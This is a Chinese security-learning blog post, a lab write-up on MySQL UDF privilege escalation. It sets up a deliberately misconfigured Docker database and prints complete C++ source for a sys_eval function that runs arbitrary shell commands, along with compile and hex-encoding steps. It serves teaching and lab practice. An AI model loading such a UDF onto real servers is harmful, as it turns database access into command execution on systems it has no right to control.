@@ -1,0 +1,810 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/06/18/SQL%E6%8F%90%E6%9D%83/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title></title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline"></h1><div class="meta"><span class="item" title="创建时间：2026-06-18 20:04:56"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-06-18T20:04:56+08:00">2026-06-18</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>17k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>16 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/06/18/SQL%E6%8F%90%E6%9D%83/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="sql提权"><a class="anchor" href="#sql提权">#</a> SQL提权</h1>
+<p>学完了各种数据库的注入手法，接下来这篇文章我们一起学习一下什么是SQL提权</p>
+<p><strong>垂直提权</strong>：指从低权限身份到高权限身份，比如从普通用户到管理员</p>
+<p><strong>水平越权</strong>：严格来说不叫做提权，指的是用户A能够访问用户B的数据，没有变成管理员但是越过了自己的权限边界</p>
+<p><strong>数据库到系统权限</strong>：原本是数据库权限，通过数据库的危险功能或错误配置今日影响服务器文件系统或操作系统</p>
+<h1 id="mysql"><a class="anchor" href="#mysql">#</a> MySQL</h1>
+<h2 id="udf提权"><a class="anchor" href="#udf提权">#</a> UDF提权</h2>
+<p>UDF提权不是“直接把MySQL用户变成root”，更准确的说是让拥有危险数据库权限的账号，把自定义<code>.so</code>动态库加载进<code>mysqld</code>进程，从而获得mysqld运行账户的系统命令执行能力</p>
+<p>所以UDF提权通常是<strong>数据库权限到操作系统命令权限</strong></p>
+<p>如果mysqld是以mysql用户运行，那么命令也是以mysql用户 执行，只有在极端错误配置下，比如mysqld以root运行，才可能直接变成root。</p>
+<h3 id="本地靶场搭建"><a class="anchor" href="#本地靶场搭建">#</a> 本地靶场搭建</h3>
+<p>我们在本地创建文件夹，在里面存放五个文件，参考命名和结构如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>mysql_udf_lab</span></span>
+<span class="line"><span>├── docker-compose.yml</span></span>
+<span class="line"><span>├── Dockerfile</span></span>
+<span class="line"><span>├── mysqld.cnf</span></span>
+<span class="line"><span>├── init.sql</span></span>
+<span class="line"><span>└── udf_eval.cc</span></span></code></pre>
+<p>将以下内容复制进<code>docker-compose.yml</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>services:</span></span>
+<span class="line"><span>  mysql:</span></span>
+<span class="line"><span>    build: .</span></span>
+<span class="line"><span>    container_name: mysql-udf-lab</span></span>
+<span class="line"><span>    ports:</span></span>
+<span class="line"><span>      - "127.0.0.1:3308:3306"</span></span>
+<span class="line"><span>    environment:</span></span>
+<span class="line"><span>      MYSQL_ROOT_PASSWORD: rootpass</span></span>
+<span class="line"><span>      MYSQL_DATABASE: appdb</span></span>
+<span class="line"><span>    volumes:</span></span>
+<span class="line"><span>      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro</span></span></code></pre>
+<p>这里把MySQL只绑定到<code>127.0.0.1:3308</code></p>
+<p>然后创建mysqld.cnf：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>[mysqld]</span></span>
+<span class="line"><span>secure-file-priv=</span></span>
+<span class="line"><span>plugin-dir=/usr/lib/mysql/plugin</span></span>
+<span class="line"><span>skip-log-bin</span></span></code></pre>
+<p>这里留下漏洞<code>secure-file-priv=</code>：表示不限制MySQL文件导入导出目录，MySQL官方文档说明，<code>secure-file-priv</code>用来限制<code>LOAD DATA</code>、<code>SELECT ... INTO OUTFILE</code>和<code>LOAD_FILE()</code>等文件操作，如果为空就不起限制作用</p>
+<p>创建init.sql：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>CREATE TABLE appdb.users (</span></span>
+<span class="line"><span>    id INT PRIMARY KEY AUTO_INCREMENT,</span></span>
+<span class="line"><span>    username VARCHAR(50),</span></span>
+<span class="line"><span>    password VARCHAR(100)</span></span>
+<span class="line"><span>);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>INSERT INTO appdb.users(username, password) VALUES</span></span>
+<span class="line"><span>('admin', 'admin123'),</span></span>
+<span class="line"><span>('guest', 'guest123'),</span></span>
+<span class="line"><span>('flag', 'ZLARYY&#123;local_udf_realistic_lab&#125;');</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>CREATE USER 'webapp'@'%' IDENTIFIED BY 'webpass';</span></span>
+<span class="line"><span>GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'webapp'@'%';</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>CREATE USER 'misconf'@'%' IDENTIFIED BY 'misconfpass';</span></span>
+<span class="line"><span>GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'misconf'@'%';</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-- 故意给危险权限</span></span>
+<span class="line"><span>GRANT FILE ON *.* TO 'misconf'@'%';</span></span>
+<span class="line"><span>GRANT INSERT ON mysql.* TO 'misconf'@'%';</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>FLUSH PRIVILEGES;</span></span></code></pre>
+<p>创建Dockerfile：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>FROM mysql:8.4</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>USER root</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>RUN printf '[mysqld]\nsecure-file-priv=\nplugin-dir=/usr/lib/mysql/plugin\nskip-log-bin\n' > /etc/mysql/conf.d/mysqld.cnf \</span></span>
+<span class="line"><span>    &#x26;&#x26; chmod 644 /etc/mysql/conf.d/mysqld.cnf \</span></span>
+<span class="line"><span>    &#x26;&#x26; mkdir -p /usr/lib/mysql/plugin \</span></span>
+<span class="line"><span>    &#x26;&#x26; chown -R mysql:mysql /usr/lib/mysql/plugin \</span></span>
+<span class="line"><span>    &#x26;&#x26; chmod 777 /usr/lib/mysql/plugin</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>USER mysql</span></span></code></pre>
+<p>启动靶场：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>docker compose up -d --build</span></span></code></pre>
+<p>以misconf身份进入MySQL：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>docker exec -it mysql-udf-real-lab mysql -umisconf -pmisconfpass</span></span></code></pre>
+<h3 id="准备udf动态库"><a class="anchor" href="#准备udf动态库">#</a> 准备UDF动态库</h3>
+<p>在虚拟机里可以创建一个文件夹存放<code>udf_eval.cc</code>文件，比如：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>mkdir attacker_udf</span></span>
+<span class="line"><span>cd attacker_udf</span></span>
+<span class="line"><span>vim udf_eval.cc</span></span></code></pre>
+<p>将以下内容写入udf_eval.cc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>#include &#x3C;mysql.h></span></span>
+<span class="line"><span>#include &#x3C;cstdio></span></span>
+<span class="line"><span>#include &#x3C;cstdlib></span></span>
+<span class="line"><span>#include &#x3C;cstring></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>extern "C" &#123;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>bool sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) &#123;</span></span>
+<span class="line"><span>    if (args->arg_count != 1) &#123;</span></span>
+<span class="line"><span>        std::strcpy(message, "sys_eval() requires exactly one argument");</span></span>
+<span class="line"><span>        return true;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    args->arg_type[0] = STRING_RESULT;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    initid->maybe_null = true;</span></span>
+<span class="line"><span>    initid->max_length = 8192;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    initid->ptr = static_cast&#x3C;char *>(std::malloc(8192));</span></span>
+<span class="line"><span>    if (initid->ptr == nullptr) &#123;</span></span>
+<span class="line"><span>        std::strcpy(message, "malloc failed");</span></span>
+<span class="line"><span>        return true;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    std::memset(initid->ptr, 0, 8192);</span></span>
+<span class="line"><span>    return false;</span></span>
+<span class="line"><span>&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>void sys_eval_deinit(UDF_INIT *initid) &#123;</span></span>
+<span class="line"><span>    if (initid->ptr != nullptr) &#123;</span></span>
+<span class="line"><span>        std::free(initid->ptr);</span></span>
+<span class="line"><span>        initid->ptr = nullptr;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span>&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>char *sys_eval(</span></span>
+<span class="line"><span>    UDF_INIT *initid,</span></span>
+<span class="line"><span>    UDF_ARGS *args,</span></span>
+<span class="line"><span>    char *result,</span></span>
+<span class="line"><span>    unsigned long *length,</span></span>
+<span class="line"><span>    char *is_null,</span></span>
+<span class="line"><span>    char *error</span></span>
+<span class="line"><span>) &#123;</span></span>
+<span class="line"><span>    char *buffer = initid->ptr;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    if (buffer == nullptr) &#123;</span></span>
+<span class="line"><span>        *error = 1;</span></span>
+<span class="line"><span>        return nullptr;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    std::memset(buffer, 0, 8192);</span></span>
+<span class="line"><span>    *is_null = 0;</span></span>
+<span class="line"><span>    *error = 0;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    if (args->args[0] == nullptr) &#123;</span></span>
+<span class="line"><span>        const char *msg = "argument is NULL";</span></span>
+<span class="line"><span>        std::strncpy(buffer, msg, 8191);</span></span>
+<span class="line"><span>        *length = std::strlen(buffer);</span></span>
+<span class="line"><span>        return buffer;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    unsigned long cmd_len = args->lengths[0];</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    /*</span></span>
+<span class="line"><span>     * args->args[0] 不一定是以 \0 结尾的 C 字符串，</span></span>
+<span class="line"><span>     * 所以这里手动复制并补 \0。</span></span>
+<span class="line"><span>     *</span></span>
+<span class="line"><span>     * 额外追加 " 2>&#x26;1"，这样可以把 stderr 也捕获回来，</span></span>
+<span class="line"><span>     * 方便看到命令错误信息。</span></span>
+<span class="line"><span>     */</span></span>
+<span class="line"><span>    const char *redirect = " 2>&#x26;1";</span></span>
+<span class="line"><span>    size_t redirect_len = std::strlen(redirect);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    char *cmd = static_cast&#x3C;char *>(std::malloc(cmd_len + redirect_len + 1));</span></span>
+<span class="line"><span>    if (cmd == nullptr) &#123;</span></span>
+<span class="line"><span>        const char *msg = "malloc command buffer failed";</span></span>
+<span class="line"><span>        std::strncpy(buffer, msg, 8191);</span></span>
+<span class="line"><span>        *length = std::strlen(buffer);</span></span>
+<span class="line"><span>        return buffer;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    std::memcpy(cmd, args->args[0], cmd_len);</span></span>
+<span class="line"><span>    std::memcpy(cmd + cmd_len, redirect, redirect_len);</span></span>
+<span class="line"><span>    cmd[cmd_len + redirect_len] = '\0';</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    FILE *fp = popen(cmd, "r");</span></span>
+<span class="line"><span>    std::free(cmd);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    if (fp == nullptr) &#123;</span></span>
+<span class="line"><span>        const char *msg = "popen failed";</span></span>
+<span class="line"><span>        std::strncpy(buffer, msg, 8191);</span></span>
+<span class="line"><span>        *length = std::strlen(buffer);</span></span>
+<span class="line"><span>        return buffer;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    char temp[512];</span></span>
+<span class="line"><span>    size_t total = 0;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    while (std::fgets(temp, sizeof(temp), fp) != nullptr) &#123;</span></span>
+<span class="line"><span>        size_t len = std::strlen(temp);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        if (total + len >= 8191) &#123;</span></span>
+<span class="line"><span>            len = 8191 - total;</span></span>
+<span class="line"><span>        &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        std::memcpy(buffer + total, temp, len);</span></span>
+<span class="line"><span>        total += len;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        if (total >= 8191) &#123;</span></span>
+<span class="line"><span>            break;</span></span>
+<span class="line"><span>        &#125;</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    int status = pclose(fp);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    if (total == 0) &#123;</span></span>
+<span class="line"><span>        std::snprintf(buffer, 8192, "[no output], command status: %d", status);</span></span>
+<span class="line"><span>        total = std::strlen(buffer);</span></span>
+<span class="line"><span>    &#125; else &#123;</span></span>
+<span class="line"><span>        buffer[total] = '\0';</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    *length = static_cast&#x3C;unsigned long>(total);</span></span>
+<span class="line"><span>    return buffer;</span></span>
+<span class="line"><span>&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<p>安装编译依赖：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo apt update</span></span>
+<span class="line"><span>sudo apt install -y g++ default-libmysqlclient-dev</span></span></code></pre>
+<p>编译：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>g++ -Wall -fPIC -shared \</span></span>
+<span class="line"><span>  -I/usr/include/mysql \</span></span>
+<span class="line"><span>  -o lib_udf_lab.so \</span></span>
+<span class="line"><span>  udf_eval.cc</span></span></code></pre>
+<p>查看文件：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>file lib_udf_lab.so</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#应该类似lib_udf_lab.so: ELF 64-bit LSB shared object, x86-64</span></span></code></pre>
+<h3 id="udf提权原理"><a class="anchor" href="#udf提权原理">#</a> UDF提权原理</h3>
+<p>在MySQL中存在一个错误配置账号<code>misconf</code>，它拥有<code>FILE</code>、<code>mysql.* INSERT</code>等危险权限，并且目标环境的<code>secure_file_priv</code>不限制写入路径、<code>plugin_dir</code>可写，攻击者可以先将自己编译好的UDF动态库<code>lib_udf_lab.so</code>转为十六进制，然后通过<code>select ... into dumpfile /usr/lib/mysql/plugin/lib_udf_lab.so</code>将<code>lib_udf_lab.so</code>写入MySQL插件目录，之后我们可以通过<code>create function sys_eval ... soname 'lib_udf_lab.so'</code>注册自定义UDF函数，MySQL的mysqld进程加载<code>.so</code>动态库之后调用<code>sys_eval()</code>函数触发其内部的<code>system(&quot;id&quot;)</code>调用UDF内部的<code>system()</code>从而实现以<code>mysqld</code>进程用户身份执行系统命令</p>
+<h3 id="提权流程"><a class="anchor" href="#提权流程">#</a> 提权流程</h3>
+<p>在真实测试中，我们需要检查当前用户是否具备写入文件权限和<code>secure_file_priv</code>是否为空：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SHOW GRANTS;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/1.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GRANT FILE ON *.* TO `misconf`@`%`</span></span>
+<span class="line"><span># 表明misconf用户具有FILE权限，这个权限作用于所有的数据库，所有对象(*.*)</span></span></code></pre>
+<p>FILE权限是服务器文件读写权限，它允许<code>select load_file('/etc/passwd');</code>或者<code>select 'test' into outfile '/tmp/test.txt'</code>等</p>
+<p>在UDF提权中，这个权限用于把<code>lib_udf_lab.so</code>写入<code>plugin_dir</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GRANT SELECT, INSERT, UPDATE ON `appdb`.* TO `misconf`@`%`</span></span>
+<span class="line"><span># 表明misconf用户对appdb数据库里的所有表拥有select、insert、update权限</span></span></code></pre>
+<p>它可以执行<code>select * from appdb.users;</code>或者<code>insert into appdb.users(username,password) values('ZLARYY','2L@yY');</code>或者<code>update appdb.users set password='2L4yY' where usermame='ZLARYY';</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GRANT INSERT ON `mysql`.* TO `misconf`@`%`</span></span>
+<span class="line"><span># 表明misconf对mysql系统库里的所有表拥有insert权限</span></span></code></pre>
+<p>这一行权限允许<code>create function</code>往<code>mysql.func</code>中注册函数信息</p>
+<p>所以UDF提权的核心就是拥有写入文件权限和通过<code>create function</code>注册函数信息</p>
+<p>接下来需要查看<code>plugin_dir</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SELECT @@plugin_dir;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/2.png" class=""></p>
+<p>MySQL的UDF是可加载函数，本质是一个动态库，Linux下是<code>.so</code>，Windows下是<code>.dll</code>。MySQL不是从任意目录加载UDF，而是从<code>plugin_dir</code>指定的插件目录加载，库文件名需要对应平台动态库文件（Linux对应<code>.so</code>），并且函数会被加载到服务器中立即可用</p>
+<p>所以：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>CREATE FUNCTION sys_eval RETURNS INTEGER SONAME 'lib_udf_lab.so';</span></span></code></pre>
+<p>这句话执行之后，MySQL实际会去寻找<code>@@plugin_dir/lib_udf_lab.so</code>，那么对应的就是<code>/usr/lib/mysql/plugin/lib_udf_lab.so</code>，所以我们必须把<code>.so</code>写到这个目录</p>
+<p>之后我们查看<code>secure_file_priv</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SELECT @@secure_file_priv;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/4.png" class=""></p>
+<p><code>secure_file_priv</code>是MySQL用来限制文件导入导出路径的安全配置，如果<code>secure_file_priv</code>设置成一个非空目录，那么<code>select ... into outfile</code>或<code>into dumpfile</code>写出的文件必须位于这个目录中，所以<code>secure_file_priv</code>为空表示不限制写入路径</p>
+<p>具备这些条件之后我们看到之前所说的编译动态库：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>g++ -Wall -fPIC -shared \</span></span>
+<span class="line"><span>  -I/usr/include/mysql \</span></span>
+<span class="line"><span>  -o lib_udf_lab.so \</span></span>
+<span class="line"><span>  udf_eval.cc</span></span></code></pre>
+<p>这些命令可以将udf_exec.cc源码编译成一个Linux下可被MySQL加载的动态库文件<code>lib_udf_lab.so</code></p>
+<p><code>g++</code>：表示使用<code>C++</code>编译器</p>
+<p><code>-Wall</code>：开启编译警告，不会影响最终功能</p>
+<p><code>-fPIC</code>：（Position Independent Code）意思是生成位置无关代码，动态库<code>.so</code>被加载到内存时，加载地址不一定固定，所以<code>.so</code>里的代码需要能在不同内存地址正常运行，因此编译动态库时通常需要加上<code>-fPIC</code>，否则可能会出现动态库加载失败或者链接时出现relocation相关错误</p>
+<p><code>-shared</code>：表示生成共享库，也就是<code>.so</code>文件，如果不加<code>-shared</code>，编译器可能会尝试生成一个可执行程序（a.out）</p>
+<p><code>-I/usr/include/mysql</code>：表示让编译器去<code>/usr/include/mysql</code>目录下寻找头文件，因为UDF源码里出现了<code>#include &lt;mysql.h&gt;</code>，<code>mysql.h</code>不是C++标准库头文件，而是MySQL提供的开发头文件，如果不加这一项可能会出现<code>fatal error: mysql.h: No such file or directory</code>的报错，<code>/usr/include/mysql</code>目录存在于Kali Linux里面</p>
+<p><code>-o lib_udf_lab.so</code>：表示指定输出文件名</p>
+<p><code>udf_exec.cc</code>：需要被编译的源代码文件，里面定义了MySQL UDF函数，比如：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>long long sys_eval(...)</span></span>
+<span class="line"><span>bool sys_eval_init(...)</span></span>
+<span class="line"><span>void sys_eval_deinit(...)</span></span></code></pre>
+<p>编译后这些函数会被打包进<code>lib_udf_lab.so</code>，之后MySQL执行<code>CREATE FUNCTION sys_eval RETURNS INTEGER SONAME 'lib_udf_lab.so';</code>就会从这个<code>.so</code>文件里面寻找并加载<code>sys_eval</code></p>
+<p><code>\</code>：Linux Shell里的换行续写符，等价于</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>g++ -Wall -fPIC -shared -I/usr/include/mysql -o lib_udf_lab.so udf_eval.cc</span></span></code></pre>
+<p>编译生成好<code>lib_udf_lab.so</code>之后，我们将<code>.so</code>转为十六进制</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 在lib_udf_lab.so文件所在位置执行：</span></span>
+<span class="line"><span>xxd -p lib_udf_lab.so | tr -d '\n' > lib_udf_lab.hex</span></span>
+<span class="line"><span># 检查开头</span></span>
+<span class="line"><span>head -c 80 lib_udf_lab.hex</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/5.png" class=""></p>
